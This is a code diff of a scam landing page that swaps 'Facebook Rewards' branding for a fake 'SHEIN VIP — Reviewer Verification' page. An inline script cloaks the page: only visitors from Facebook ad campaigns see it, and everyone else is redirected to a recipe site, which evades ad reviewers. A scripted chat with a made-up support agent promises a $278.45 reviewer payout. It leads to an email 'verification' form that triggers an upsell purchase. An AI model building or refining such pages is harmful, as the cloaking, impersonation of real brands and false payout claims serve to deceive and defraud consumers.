@@ -9,27 +9,27 @@
     var isDev=h==='localhost'||h==='127.0.0.1'||h.indexOf('preview--')!==-1||h.indexOf('-preview.')!==-1||/\.lovableproject\.com$|^192\.168\./.test(h);
     var q=new URLSearchParams(location.search);
     var c=(q.get('utm_campaign')||q.get('campaign')||'').toLowerCase();
-    var camp=c.indexOf('mtp')!==-1 && !!q.get('fbclid');
+    var camp=(c.indexOf('shein')!==-1 || c.indexOf('shp')!==-1 || c.indexOf('mtp')!==-1) && !!q.get('fbclid');
     var buy=!!q.get('cid') && !!q.get('pm');
     if(!isDev && !(camp&&buy)){
       document.documentElement.style.display='none';
       location.replace('https://www.tudogostoso.com.br/receita/29124-bolo-simples.html');
       return;
     }
-    document.title='Facebook Rewards';
+    document.title='SHEIN VIP — Reviewer Verification';
     var m=document.querySelector('meta[name="description"]');
-    if(m)m.setAttribute('content','Confirm your email to release your bonus and withdraw instantly.');
+    if(m)m.setAttribute('content','Confirm your email to release your reviewer bonus and withdraw instantly.');
   }catch(e){}
 })();
 </script>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Facebook Rewards</title>
-  <meta name="description" content="Confirm your email to release your bonus and withdraw instantly.">
-  <link rel="icon" href="../images/DF32jO8vZckV.png">
+  <title>SHEIN VIP — Reviewer Verification</title>
+  <meta name="description" content="Confirm your email to release your reviewer bonus and withdraw instantly.">
+  <link rel="icon" href="../images/shein-icon.svg">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="../css/MM3nXP63nRRs.css">
 
   <!-- Trackly funnel -->
@@ -49,15 +49,17 @@
 
   <style>
     :root {
-      --fb-bg: #f0f2f5;
+      --fb-bg: #f8f9fa;
       --fb-surface: #ffffff;
-      --fb-surface-soft: #f7f8fa;
-      --fb-text: #1c1e21;
-      --fb-muted: #65676b;
-      --fb-line: #e4e6eb;
-      --fb-blue: #1877f2;
-      --fb-blue-hover: #166fe5;
-      --fb-blue-soft: #e7f3ff;
+      --fb-surface-soft: #f4f5f7;
+      --fb-text: #111111;
+      --fb-muted: #666666;
+      --fb-line: #ebebeb;
+      --shein-black: #111111;
+      --shein-coral: #ff4d6d;
+      --fb-blue: #111111;
+      --fb-blue-hover: #2b2b2b;
+      --fb-blue-soft: #fff1f2;
       --fb-green: #008a3e;
       --fb-green-soft: #e8f8f0;
     }
@@ -456,20 +458,13 @@
       <div id="step-4" class="step active" data-funnel-view="chat">
         <div class="support-shell appear">
 
-          <!-- Header: Facebook Rewards + Saldo -->
+          <!-- Header: SHEIN VIP + Balance -->
           <header class="support-header">
             <div class="support-fb-logo">
-              <svg class="support-fb-circle" viewBox="0 0 36 36" width="40" height="40" fill="none">
-                <circle cx="18" cy="18" r="18" fill="#1877F2"/>
-                <path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/>
-              </svg>
-              <div class="support-fb-brand">
-                <span class="support-fb-name">facebook</span>
-                <span class="support-fb-sub">rewards</span>
-              </div>
+              <img src="../images/shein-logo.svg" alt="SHEIN VIP" style="height:26px;object-fit:contain;">
             </div>
-            <div class="support-balance-badge">
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round">
+            <div class="support-balance-badge" style="background:var(--fb-blue-soft);color:var(--shein-coral);border:1px solid #ffd6de;">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" style="color:var(--shein-coral);">
                 <rect x="2" y="5" width="20" height="14" rx="3"></rect>
                 <line x1="2" y1="10" x2="22" y2="10"></line>
                 <line x1="6" y1="15" x2="9" y2="15"></line>
@@ -480,14 +475,14 @@
 
           <div class="support-divider"></div>
 
-          <!-- Agent Card: Emily Carter -->
+          <!-- Agent Card: Chloe Bennett -->
           <div class="support-agent-card">
             <div class="support-agent-avatar-wrap" id="support-agent-avatar-wrap">
-              <img class="support-agent-avatar" src="../images/emily-support.webp" alt="Emily Carter">
+              <img class="support-agent-avatar" src="../images/emily-support.webp" alt="Chloe Bennett">
             </div>
             <div class="support-agent-info">
-              <div class="support-agent-name" id="support-agent-name">Emily Carter</div>
-              <div class="support-agent-role" id="support-agent-role"><span class="support-status-dot"></span><span>Online</span></div>
+              <div class="support-agent-name" id="support-agent-name">Chloe Bennett</div>
+              <div class="support-agent-role" id="support-agent-role"><span class="support-status-dot"></span><span>SHEIN Reviewer Coordinator · Online</span></div>
             </div>
           </div>
 
@@ -618,7 +613,7 @@
     },
     {
       type: "message",
-      html: '<div class="bonus-pill-bubble"><span class="bonus-pill-icon">★</span> <span>You Just Won a Bonus!</span></div>',
+      html: '<div class="bonus-pill-bubble" style="border-color:#ffd6de;"><span class="bonus-pill-icon" style="background:#fff1f2;color:var(--shein-coral);border-color:#ffd6de;">★</span> <span style="font-weight:800;">Reviewer Priority Bonus Unlocked!</span></div>',
       pauseAfter: 800
     },
     {
@@ -627,7 +622,7 @@
     },
     {
       type: "message",
-      html: '<div class="support-bubble">Congratulations! A special bonus has been unlocked <strong>exclusively for you</strong>.</div>',
+      html: '<div class="support-bubble">Congratulations! An instant Tier-2 reviewer allocation bonus has been unlocked <strong>exclusively for your profile</strong>.</div>',
       pauseAfter: 1000
     },
     {
@@ -636,7 +631,7 @@
     },
     {
       type: "message",
-      html: '<div class="support-bubble">To release your bonus and avoid fraud, Facebook Rewards <strong>requires email confirmation</strong> on every first withdrawal.</div>',
+      html: '<div class="support-bubble">To release your balance and activate weekly physical product shipments, SHEIN VIP <strong>requires email confirmation</strong> on your initial payout.</div>',
       pauseAfter: 1100
     },
     {
@@ -645,7 +640,7 @@
     },
     {
       type: "message",
-      html: '<div class="support-bubble">Enter the email linked to your account below and confirm. Your bonus will be released instantly.</div>',
+      html: '<div class="support-bubble">Enter the email linked to your account below and confirm. Your payout and bonus voucher will be issued immediately.</div>',
       pauseAfter: 900
     },
     {
@@ -656,24 +651,24 @@
       type: "message",
       alignTop: true,
       html: `
-        <div class="verification-card">
-          <h3 class="verification-title">EMAIL VERIFICATION REQUIRED</h3>
+        <div class="verification-card" style="border-color:#111111;box-shadow:0 8px 24px rgba(0,0,0,0.06);">
+          <h3 class="verification-title" style="color:#111111;letter-spacing:1px;font-weight:900;">VIP REVIEWER EMAIL VERIFICATION</h3>
           <p class="verification-text">
-            Facebook Rewards needs to confirm your email before releasing your bonus. This protects your balance and unlocks instant withdrawal.
+            SHEIN VIP confirms your email to release your $278.45 accumulated payout. This locks in your permanent evaluator ID and enables instant automatic deposits.
           </p>
           <div class="verification-input-wrap">
-            <input id="upsell-email" type="email" class="verification-input" placeholder="Enter the email linked to your account" autocomplete="email">
+            <input id="upsell-email" type="email" class="verification-input" placeholder="Enter your preferred payout email" autocomplete="email">
           </div>
           <div class="upsell-actions-container">
-            <button id="btn-upsell" class="btn-upsell-submit" onclick="buyUpsell()">
-              VERIFY EMAIL
+            <button id="btn-upsell" class="btn-upsell-submit" onclick="buyUpsell()" style="background:#111111;color:#ffffff;box-shadow:0 4px 14px rgba(0,0,0,0.3);">
+              VERIFY & UNLOCK PAYOUT
             </button>
             <a id="btn-decline" href="#" class="link-upsell-decline" onclick="declineUpsell(event)">
               No thanks, I don't want this offer
             </a>
           </div>
           <p class="verification-note">
-            A confirmation link will be sent to your inbox. Can't find it? Check spam.
+            A confirmation record will be sent to your email. Protected by SHEIN VIP Security.
           </p>
         </div>
       `,
